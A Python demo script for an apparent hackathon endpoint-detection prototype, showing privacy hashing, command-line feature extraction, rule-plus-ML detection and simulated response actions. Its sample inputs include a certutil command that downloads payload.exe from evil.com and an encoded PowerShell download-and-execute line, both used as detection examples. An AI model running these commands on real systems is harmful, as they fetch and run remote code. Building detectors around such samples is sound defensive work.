#!/usr/bin/env python3
"""
CyberShell Quick Demo Script
=============================

This script demonstrates the core capabilities of the CyberShell
AI-based endpoint detection prototype.

Run: python quick_demo.py

For full demo: python quick_demo.py --scenario all
"""

import sys
import os
import json
from pathlib import Path
from datetime import datetime

# Add project root to path
sys.path.insert(0, str(Path(__file__).parent))

from utils.privacy import PrivacyHasher
from parser.feature_extractor import FeatureUtils
from model.detect import DetectionResult, RuleEngine
from playbook.actions import PlaybookActions, ExecutionMode


def print_banner():
    """Print demo banner."""
    print("""
+=================================================================+
|                                                                 |
|    CYBERSHELL - AI-Based Endpoint Detection Prototype           |
|                                                                 |
|    Windows-Safe | Userland Only | Privacy-First                 |
|                                                                 |
+=================================================================+
    """)


def demo_privacy():
    """Demonstrate privacy hashing."""
    print("\n" + "="*60)
    print("DEMO 1: Privacy-Preserving Data Collection")
    print("="*60)
    
    hasher = PrivacyHasher(salt="demo_salt")
    
    print("\n[INFO] Original PII:")
    test_data = {
        "Username": "DESKTOP\\admin",
        "IP Address": "192.168.1.100",
        "Hostname": "WORKSTATION-01"
    }
    for key, value in test_data.items():
        print(f"   {key}: {value}")
    
    print("\n[HASH] After SHA-256 Hashing:")
    username = "DESKTOP\\admin"
    ip_addr = "192.168.1.100"
    hostname = "WORKSTATION-01"
    print(f"   Username: {hasher.hash_username(username)}")
    print(f"   IP Address: {hasher.hash_ip(ip_addr)}")
    print(f"   Hostname: {hasher.hash_hostname(hostname)}")
    
    print("\n[OK] PII is anonymized before storage/analysis")
    print("   Original values are never stored in logs or sent to ML")


def demo_feature_extraction():
    """Demonstrate feature extraction."""
    print("\n" + "="*60)
    print("DEMO 2: Feature Extraction for ML")
    print("="*60)
    
    print("\n[INFO] Example Command Lines:")
    
    examples = [
        {
            "name": "Normal Command",
            "cmd": "notepad.exe readme.txt",
            "process": "notepad.exe"
        },
        {
            "name": "Suspicious LOLBin",
            "cmd": "certutil.exe -urlcache -split -f http://evil.com/payload.exe",
            "process": "certutil.exe"
        },
        {
            "name": "Encoded PowerShell",
            "cmd": "powershell.exe -enc aQBlAHgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAA=",
            "process": "powershell.exe"
        }
    ]
    
    for ex in examples:
        print(f"\n   [>] {ex['name']}:")
        print(f"      Command: {ex['cmd'][:60]}...")
        entropy = FeatureUtils.calculate_entropy(ex['cmd'])
        has_base64 = FeatureUtils.detect_base64(ex['cmd'])
        has_url = FeatureUtils.detect_url(ex['cmd'])
        is_lolbin = FeatureUtils.is_lolbin(ex['process'])
        
        print(f"      -> Entropy: {entropy:.2f} {'[!] HIGH' if entropy > 4.0 else '[OK] Normal'}")
        print(f"      -> Base64 Detected: {'[!] YES' if has_base64 else 'No'}")
        print(f"      -> URL Detected: {'[!] YES' if has_url else 'No'}")
        print(f"      -> LOLBin: {'[!] YES' if is_lolbin else 'No'}")


def demo_detection():
    """Demonstrate hybrid detection."""
    print("\n" + "="*60)
    print("DEMO 3: Hybrid Detection (Rules + ML)")
    print("="*60)
    
    print("\n[INFO] Detection Architecture:")
    print("   +--------------------+")
    print("   |  Layer 1: Rules   |  <- Fast, deterministic")
    print("   |  (15 signatures)  |    catches known patterns")
    print("   +---------+---------+")
    print("             |")
    print("   +---------v---------+")
    print("   |  Layer 2: ML     |  <- IsolationForest")
    print("   |  (anomaly score) |    catches unknown threats")
    print("   +---------+---------+")
    print("             |")
    print("   +---------v---------+")
    print("   |  Combined Score  |  <- 60% rules + 40% ML")
    print("   |  (0-100)         |")
    print("   +------------------+")
    
    engine = RuleEngine()
    print(f"\n[RULES] Active Detection Rules: {len(engine.rules)}")
    
    # Show some rules
    print("\n   Top Priority Rules:")
    for rule in engine.rules[:5]:
        print(f"   * {rule.id}: {rule.name} [{rule.severity.upper()}]")


def demo_playbook():
    """Demonstrate playbook actions."""
    print("\n" + "="*60)
    print("DEMO 4: Response Playbook (SIMULATE MODE)")
    print("="*60)
    
    print("\n[WARN] All actions are SIMULATED by default")
    print("   Real execution requires: --execute --vm flags\n")
    
    playbook = PlaybookActions(mode=ExecutionMode.SIMULATE)
    
    actions = [
        ("Kill Process", lambda: playbook.kill_process(pid=6621, process_name="malware.exe")),
        ("Isolate Network", lambda: playbook.isolate_network()),
        ("Quarantine File", lambda: playbook.quarantine_file("C:\\temp\\suspicious.exe")),
        ("Block IP", lambda: playbook.block_ip("10.0.0.100")),
    ]
    
    for name, action in actions:
        print(f"   [>] {name}:")
        result = action()
        print(f"      Status: {'[SIM] Simulated' if result.simulated else '[EXEC] Executed'}")


def demo_scenarios():
    """Show available demo scenarios."""
    print("\n" + "="*60)
    print("DEMO 5: Pre-built Scenarios")
    print("="*60)
    
    scenarios_dir = Path(__file__).parent / "scenarios" / "data"
    
    scenarios = [
        {
            "name": "Benign",
            "path": scenarios_dir / "benign",
            "desc": "Normal office work - Word, Chrome, Explorer",
            "expected": "No alerts"
        },
        {
            "name": "Benign Anomaly",
            "path": scenarios_dir / "benign-anomaly",
            "desc": "Developer activity - Git, Docker, scheduled tasks",
            "expected": "Low confidence ML flags (FP testing)"
        },
        {
            "name": "Ransomware Attack",
            "path": scenarios_dir / "malicious-ransomware",
            "desc": "Simulated ransomware - vssadmin, file encryption",
            "expected": "HIGH alerts from rules + ML"
        }
    ]
    
    print("\n[INFO] Available Demo Scenarios:\n")
    for i, scenario in enumerate(scenarios, 1):
        csv_file = list(scenario['path'].glob('*.csv'))
        status = "[OK]" if csv_file else "[X]"
        print(f"   {i}. {scenario['name']} {status}")
        print(f"      Description: {scenario['desc']}")
        print(f"      Expected: {scenario['expected']}")
        if csv_file:
            print(f"      Data: {csv_file[0].name}")
        print()


def run_full_demo():
    """Run the complete demo."""
    print_banner()
    
    print("\n[INFO] CyberShell Demo - AI-Based Endpoint Detection")
    print("   For hackathon demonstration purposes")
    print("   Windows-safe: No kernel drivers, userland only")
    print("-"*60)
    
    demo_privacy()
    demo_feature_extraction()
    demo_detection()
    demo_playbook()
    demo_scenarios()
    
    print("\n" + "="*60)
    print("DEMO COMPLETE")
    print("="*60)
    print("\nNext Steps:")
    print("  1. Run Streamlit UI: streamlit run ui/streamlit_app.py")
    print("  2. Run tests: pytest tests/ -v")
    print("  3. Try scenarios: python scenarios/runner.py --scenario ransomware")
    print("\n[!] Remember: All actions are SIMULATED by default!")
    print("="*60 + "\n")


if __name__ == "__main__":
    import argparse
    
    parser = argparse.ArgumentParser(description="CyberShell Quick Demo")
    parser.add_argument("--privacy", action="store_true", help="Demo privacy hashing only")
    parser.add_argument("--features", action="store_true", help="Demo feature extraction only")
    parser.add_argument("--detection", action="store_true", help="Demo detection only")
    parser.add_argument("--playbook", action="store_true", help="Demo playbook only")
    parser.add_argument("--scenarios", action="store_true", help="Show scenarios only")
    
    args = parser.parse_args()
    
    # If specific demos requested
    if args.privacy:
        print_banner()
        demo_privacy()
    elif args.features:
        print_banner()
        demo_feature_extraction()
    elif args.detection:
        print_banner()
        demo_detection()
    elif args.playbook:
        print_banner()
        demo_playbook()
    elif args.scenarios:
        print_banner()
        demo_scenarios()
    else:
        # Run full demo
        run_full_demo()
